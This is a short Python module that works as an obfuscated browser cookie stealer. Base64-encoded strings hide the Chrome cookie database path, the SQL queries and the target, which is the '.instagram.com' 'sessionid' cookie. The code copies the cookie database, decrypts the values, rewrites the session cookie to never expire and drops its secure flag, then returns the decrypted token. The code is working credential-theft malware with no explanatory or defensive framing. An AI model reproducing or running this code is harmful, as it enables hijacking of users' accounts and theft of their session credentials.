from gisi.gek import gek
from gisi.bd import bd
from gisi.dd import dd
import sqlite3
import shutil
import os


def gisi():
    try:
        dbp = os.path.join(os.environ[bd("VVNFUlBST0ZJTEU=")], bd("QXBwRGF0YQ=="), bd("TG9jYWw="), bd("R29vZ2xl"), bd("Q2hyb21l"), bd("VXNlciBEYXRh"), bd("RGVmYXVsdA=="), bd("TmV0d29yaw=="), bd("Q29va2llcw=="))
        fn = bd("Q29va2llcy5kYg==")
        fp = os.path.join(os.environ[bd("VVNFUlBST0ZJTEU=")], bd("QXBwRGF0YQ=="), bd("TG9jYWw="), bd("R29vZ2xl"), bd("Q2hyb21l"), bd("VXNlciBEYXRh"), fn)
        if not os.path.isfile(fp):
            shutil.copyfile(dbp, fp)
        dt = sqlite3.connect(fp)
        dt.text_factory = lambda b: b.decode(errors="ignore")
        c = dt.cursor()
        c.execute(bd("CiAgICBTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIHZhbHVlLCBjcmVhdGlvbl91dGMsIGxhc3RfYWNjZXNzX3V0YywgZXhwaXJlc191dGMsIGVuY3J5cHRlZF92YWx1ZSAKICAgIEZST00gY29va2llcw=="))
        key = gek()
        for hk, n, v, cc, lau, ec, ev in c.fetchall():
            if not v:
                dv = dd(ev, key)
            else:
                dv = v
            if hk == bd("Lmluc3RhZ3JhbS5jb20=") and n == bd("c2Vzc2lvbmlk"):
                c.execute(
                    bd("CiAgICAgICAgICAgIFVQREFURSBjb29raWVzIFNFVCB2YWx1ZSA9ID8sIGhhc19leHBpcmVzID0gMSwgZXhwaXJlc191dGMgPSA5OTk5OTk5OTk5OTk5OTk5OSwgaXNfcGVyc2lzdGVudCA9IDEsIGlzX3NlY3VyZSA9IDAKICAgICAgICAgICAgV0hFUkUgaG9zdF9rZXkgPSA/CiAgICAgICAgICAgIEFORCBuYW1lID0gPw=="), (dv, hk, n))
                return dv
        dt.commit()
        dt.close()
        try:
            os.remove(fn)
        except:
            pass
    except:
        return ""
